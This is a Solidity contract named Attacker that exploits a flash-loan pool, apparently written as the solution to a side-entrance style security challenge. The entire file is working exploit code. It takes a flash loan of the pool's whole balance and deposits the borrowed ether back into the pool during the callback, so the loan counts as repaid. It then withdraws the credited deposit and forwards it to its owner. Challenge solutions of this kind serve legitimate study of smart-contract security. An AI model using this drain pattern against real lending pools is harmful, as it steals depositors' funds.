// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./web3bridgecxipool.sol";



// Attacker contract that will exploit the flash loan
contract Attacker is IFlashLoanEtherReceiver {
 

    Web3BridgeCXIPool pool;

    address owner;

    constructor(address _pool) {
        pool = Web3BridgeCXIPool(_pool);
        owner = msg.sender;
    }

    

    function withdraw() public {
        require(msg.sender == owner, "only owner");
        pool.withdraw();
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "failed withdraw");
    }

    function execute() external payable override {
        uint256 balance = address(this).balance;
        pool.deposit{value: balance}();
    }

    function initiateFlashLoan() public {
        pool.flashLoan(address(pool).balance);
    }

    receive() external payable {}
}